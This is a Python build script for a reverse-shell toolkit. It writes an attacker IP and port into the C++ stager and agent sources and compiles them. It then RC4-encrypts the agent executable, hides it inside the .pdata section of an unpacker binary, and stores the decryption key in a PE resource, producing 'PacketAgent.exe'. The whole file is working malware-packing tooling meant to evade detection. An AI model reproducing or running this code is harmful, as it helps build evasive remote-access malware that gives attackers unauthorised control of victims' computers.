import os
import lief
import argparse
import subprocess
from Cryptodome.Cipher import ARC4
from Cryptodome.Random import get_random_bytes


def compile_stub(input_sln, flags=[]):
    flags.insert(0, "/p:Configuration=Release")
    cmd = ["msbuild", input_sln] + flags
    output = subprocess.run(cmd, check=True)


def align(x, al):
    """ return <x> aligned to <al> """
    if x % al == 0:
        return x
    else:
        return x - (x % al) + al


def pad_data(data, al):
    """ return <data> padded with 0 to a size aligned with <al> """
    return data + ([0] * (align(len(data), al) - len(data)))


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='Specify ip and port which the client will try to connect')
    parser.add_argument('--ip', metavar="ip", type=str, help='ip of the remote server')
    parser.add_argument('--port', metavar="port", type=str, help='port of the remote server')
    args = parser.parse_args()

    # write the server ip and port into the cpp file of the stager/agent
    PATH_C_STAGER = os.path.join("ReverseShell3Server", "Server", "src", "Main.cpp")
    PATH_C_AGENT = os.path.join("ReverseShell3Agent", "Agent", "src", "Main.cpp")

    with open(PATH_C_STAGER, "r") as stager_file:
        stager_file_out = stager_file.read()
        stager_file_out = stager_file_out.replace('if (TCPStager.Listen("") != M_Success)', f'if (TCPStager.Listen("{args.port}") != M_Success)')

    with open(PATH_C_STAGER, "w") as stager_file_writer:
        stager_file_writer.write(stager_file_out)

    with open(PATH_C_AGENT, "r") as agent_file:
        agent_file_out = agent_file.read()
        agent_file_out = agent_file_out.replace('res = agent.Connect("", "");', f'res = agent.Connect("{args.ip}", "{args.port}");')

    with open(PATH_C_AGENT, "w") as agent_file_writer:
        agent_file_writer.write(agent_file_out)

    # compile the project
    compile_stub("ReverseShell3.sln")

    with open(PATH_C_STAGER, "r") as stager_file:
        stager_file_out = stager_file.read()
        stager_file_out = stager_file_out.replace(f'if (TCPStager.Listen("{args.port}") != M_Success)', 'if (TCPStager.Listen("") != M_Success)')

    with open(PATH_C_STAGER, "w") as stager_file_writer:
        stager_file_writer.write(stager_file_out)

    with open(PATH_C_AGENT, "r") as agent_file:
        agent_file_out = agent_file.read()
        agent_file_out = agent_file_out.replace(f'res = agent.Connect("{args.ip}", "{args.port}");', 'res = agent.Connect("", "");')

    with open(PATH_C_AGENT, "w") as agent_file_writer:
        agent_file_writer.write(agent_file_out)

    PATH_UNPACKER = os.path.join("bin", "x64", "Release", "Unpacker.exe")
    PATH_AGENT = os.path.join("bin", "x64", "Release", "ReverseShell3Agent.exe")

    with open(PATH_UNPACKER, 'rb') as loader:
    	raw_loader = loader.read()

    with open(PATH_AGENT, 'rb') as exefile:
    	exefile_raw = exefile.read()

    pe_loader = list(raw_loader)
    pe_loader = lief.PE.parse(pe_loader)

    loader_section_alignment = pe_loader.optional_header.section_alignment
    loader_file_alignment = pe_loader.optional_header.file_alignment

    key = get_random_bytes(16)
    rc4 = ARC4.new(key)

    encrypted_exe = list(rc4.encrypt(exefile_raw))
    insert_at_section = 3 # .pdata section

    raw_section = pe_loader.sections[insert_at_section].content.tolist()
    raw_section = raw_section + encrypted_exe
    pe_loader.sections[insert_at_section].content = pad_data(raw_section, loader_file_alignment)

    # correct file alignment
    pe_loader.sections[insert_at_section].sizeof_raw_data = align(pe_loader.sections[insert_at_section].sizeof_raw_data + len(encrypted_exe), loader_file_alignment)
    # add the virtual size of the encrypted exe
    pe_loader.sections[insert_at_section].virtual_size += len(encrypted_exe)

    # for each forward section correct section alignments and the pointer to raw data
    for num in range(insert_at_section + 1, pe_loader.header.numberof_sections):
        pe_loader.sections[num].pointerto_raw_data = pe_loader.sections[num - 1].pointerto_raw_data + pe_loader.sections[num - 1].sizeof_raw_data
        pe_loader.sections[num].virtual_address = pe_loader.sections[num - 1].virtual_address + align(pe_loader.sections[num - 1].virtual_size, loader_section_alignment)

    # push the key and the exe pattern to the pe resources
    root_level = lief.PE.ResourceDirectory()
    root_level.id = 10

    second_level = lief.PE.ResourceDirectory()
    second_level.id = 0x800000aa # lief builder will correct the offset automatically
    second_level.name = "data"

    rc_data = encrypted_exe[:16] + list(key)
    key = lief.PE.ResourceData(rc_data, 1)
    key.id = 0

    second_level.add_data_node(key)
    root_level.add_directory_node(second_level)
    pe_loader.resources.add_directory_node(root_level)

    builder = lief.PE.Builder(pe_loader)
    builder.build_resources(True)
    builder.build_relocations(True)
    builder.build()
    builder.write("PacketAgent.exe")